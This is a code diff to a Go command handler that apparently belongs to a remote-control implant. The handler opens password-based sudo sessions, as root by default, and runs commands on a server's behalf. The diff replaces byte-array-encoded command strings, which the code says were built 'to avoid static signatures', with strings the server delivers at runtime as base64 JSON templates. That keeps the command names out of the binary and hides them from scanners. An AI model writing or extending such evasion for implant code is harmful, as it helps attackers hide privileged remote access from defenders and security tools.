@@ -5,6 +5,8 @@
 package main
 
 import (
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"strings"
 	"time"
@@ -16,25 +18,62 @@ const (
 	execAbsoluteTimeout = 6 * time.Second
 )
 
-// Sudo session strings (constructed to avoid static signatures)
-var (
-	// Command name
-	sudoSessCmdName = string([]byte{0x73, 0x75, 0x64, 0x6f, 0x2d, 0x73, 0x65, 0x73, 0x73, 0x69, 0x6f, 0x6e}) // sudo-session
-
-	// Subcommands
-	sudoSessStart           = string([]byte{0x73, 0x74, 0x61, 0x72, 0x74})                                                             // start
-	sudoSessStop            = string([]byte{0x73, 0x74, 0x6f, 0x70})                                                                   // stop
-	sudoSessExec            = string([]byte{0x65, 0x78, 0x65, 0x63})                                                                   // exec
-	sudoSessExecStateful    = string([]byte{0x65, 0x78, 0x65, 0x63, 0x2d, 0x73, 0x74, 0x61, 0x74, 0x65, 0x66, 0x75, 0x6c})             // exec-stateful
-	sudoSessEnableStateful  = string([]byte{0x65, 0x6e, 0x61, 0x62, 0x6c, 0x65, 0x2d, 0x73, 0x74, 0x61, 0x74, 0x65, 0x66, 0x75, 0x6c}) // enable-stateful
-	sudoSessDisableStateful = string([]byte{0x64, 0x69, 0x73, 0x61, 0x62, 0x6c, 0x65, 0x2d, 0x73, 0x74, 0x61, 0x74, 0x65, 0x66, 0x75, 0x6c}) // disable-stateful
-	sudoSessStatus          = string([]byte{0x73, 0x74, 0x61, 0x74, 0x75, 0x73})                                                       // status
-
-	// Default user
-	sudoSessDefaultUser = string([]byte{0x72, 0x6f, 0x6f, 0x74}) // root
+// Template index constants (must match server-side common.go)
+const (
+	idxSudoSessCmdName         = 320 // sudo-session
+	idxSudoSessStart           = 321 // start
+	idxSudoSessStop            = 322 // stop
+	idxSudoSessExec            = 323 // exec
+	idxSudoSessExecStateful    = 324 // exec-stateful
+	idxSudoSessEnableStateful  = 325 // enable-stateful
+	idxSudoSessDisableStateful = 326 // disable-stateful
+	idxSudoSessStatus          = 327 // status
+	idxSudoSessDefaultUser     = 328 // root
 )
 
-type SudoSessionCommand struct{}
+// SudoSessTemplate holds parsed template data
+type SudoSessTemplate struct {
+	Version   int      `json:"v"`
+	Type      int      `json:"t"`
+	Templates []string `json:"tpl"`
+}
+
+type SudoSessionCommand struct {
+	tpl *SudoSessTemplate
+}
+
+// getTpl safely retrieves a template string by index
+func (c *SudoSessionCommand) getTpl(idx int) string {
+	if c.tpl == nil || idx >= len(c.tpl.Templates) {
+		return ""
+	}
+	return c.tpl.Templates[idx]
+}
+
+// parseTemplate extracts and parses the template from command data
+func (c *SudoSessionCommand) parseTemplate(ctx *CommandContext) {
+	ctx.mu.RLock()
+	cmd := ctx.CurrentCommand
+	ctx.mu.RUnlock()
+
+	if cmd == nil || cmd.Data == "" {
+		return
+	}
+
+	// Decode base64
+	decoded, err := base64.StdEncoding.DecodeString(cmd.Data)
+	if err != nil {
+		return
+	}
+
+	// Parse JSON
+	var tpl SudoSessTemplate
+	if err := json.Unmarshal(decoded, &tpl); err != nil {
+		return
+	}
+
+	c.tpl = &tpl
+}
 
 // getActiveSession retrieves and validates the sudo session from context.
 // Returns the session and an error message if not available or inactive.
@@ -62,6 +101,9 @@ func getActiveSession(ctx *CommandContext) (*SudoSession, string) {
 }
 
 func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) CommandResult {
+	// Parse template from command data
+	c.parseTemplate(ctx)
+
 	if len(args) == 0 {
 		return CommandResult{
 			Output:      Err(E1),
@@ -72,8 +114,8 @@ func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) Command
 
 	subCommand := args[0]
 
-	switch subCommand {
-	case sudoSessStart:
+	// Handle "start" subcommand
+	if subCommand == c.getTpl(idxSudoSessStart) {
 		if len(args) < 2 {
 			return CommandResult{
 				Output:      Err(E1),
@@ -83,7 +125,7 @@ func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) Command
 		}
 
 		password := args[1]
-		targetUser := sudoSessDefaultUser // Default to root
+		targetUser := c.getTpl(idxSudoSessDefaultUser) // Default to root
 
 		// Check if a specific user was provided
 		if len(args) >= 3 {
@@ -130,8 +172,10 @@ func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) Command
 			ExitCode:    0,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
+	}
 
-	case sudoSessExec, sudoSessExecStateful:
+	// Handle "exec" or "exec-stateful" subcommand
+	if subCommand == c.getTpl(idxSudoSessExec) || subCommand == c.getTpl(idxSudoSessExecStateful) {
 		if len(args) < 2 {
 			return CommandResult{
 				Output:      Err(E1),
@@ -150,7 +194,7 @@ func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) Command
 		}
 
 		// If exec-stateful, temporarily enable stateful mode
-		if subCommand == sudoSessExecStateful {
+		if subCommand == c.getTpl(idxSudoSessExecStateful) {
 			// Try to enable stateful if not already enabled
 			session.mu.Lock()
 			stateful := session.useStateful
@@ -197,10 +241,8 @@ func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) Command
 				}
 			}
 
-			output := result.output
-
 			return CommandResult{
-				Output:      output,
+				Output:      result.output,
 				ExitCode:    result.exitCode,
 				CompletedAt: time.Now().Format(time.RFC3339),
 			}
@@ -212,8 +254,10 @@ func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) Command
 				CompletedAt: time.Now().Format(time.RFC3339),
 			}
 		}
+	}
 
-	case sudoSessEnableStateful:
+	// Handle "enable-stateful" subcommand
+	if subCommand == c.getTpl(idxSudoSessEnableStateful) {
 		session, errMsg := getActiveSession(ctx)
 		if session == nil {
 			return CommandResult{
@@ -236,8 +280,10 @@ func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) Command
 			ExitCode:    0,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
+	}
 
-	case sudoSessDisableStateful:
+	// Handle "disable-stateful" subcommand
+	if subCommand == c.getTpl(idxSudoSessDisableStateful) {
 		session, errMsg := getActiveSession(ctx)
 		if session == nil {
 			return CommandResult{
@@ -254,8 +300,10 @@ func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) Command
 			ExitCode:    0,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
+	}
 
-	case sudoSessStatus:
+	// Handle "status" subcommand
+	if subCommand == c.getTpl(idxSudoSessStatus) {
 		// For status, we check for session existence but don't require it to be active
 		ctx.mu.RLock()
 		sessionInterface := ctx.SudoSession
@@ -275,8 +323,10 @@ func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) Command
 			ExitCode:    0,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
+	}
 
-	case sudoSessStop:
+	// Handle "stop" subcommand
+	if subCommand == c.getTpl(idxSudoSessStop) {
 		ctx.mu.Lock()
 		sessionInterface := ctx.SudoSession
 
@@ -292,7 +342,7 @@ func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) Command
 		session := sessionInterface.(*SudoSession)
 		targetUser := session.targetUser
 		if targetUser == "" {
-			targetUser = sudoSessDefaultUser
+			targetUser = c.getTpl(idxSudoSessDefaultUser)
 		}
 
 		err := session.Close()
@@ -312,12 +362,12 @@ func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) Command
 			ExitCode:    0,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
+	}
 
-	default:
-		return CommandResult{
-			Output:      ErrCtx(E21, subCommand),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
-		}
+	// Unknown subcommand
+	return CommandResult{
+		Output:      ErrCtx(E21, subCommand),
+		ExitCode:    1,
+		CompletedAt: time.Now().Format(time.RFC3339),
 	}
 }
